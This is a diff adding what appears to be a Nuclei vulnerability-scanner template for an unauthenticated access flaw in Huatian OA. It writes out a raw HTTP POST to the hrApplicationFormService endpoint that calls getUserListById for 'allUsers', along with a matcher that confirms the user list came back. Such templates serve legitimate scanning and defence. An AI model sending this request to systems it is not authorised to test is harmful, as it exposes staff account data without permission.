@@ -1,0 +1,40 @@
+id: huatian-oa-hrApplicationFormService-unauth
+
+info:
+  name: huatian-oa-hrApplicationFormService-unauth
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+        Cache-Control: no-cache
+        Connection: close
+        Content-Type: text/xml;charset=utf-8
+        Pragma: no-cache
+        X-Buffalo-Version: 2.0
+
+        <buffalo-call>
+        <method>getUserListById</method>
+        <boolean>0</boolean>
+        <string></string>
+        <string>allUsers</string>
+        <string></string>
+        <string></string>
+        <boolean>0</boolean>
+        <boolean>1</boolean>
+        </buffalo-call>
+
+    max-size: 1024
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'buffalo-reply','ArrayList')
+
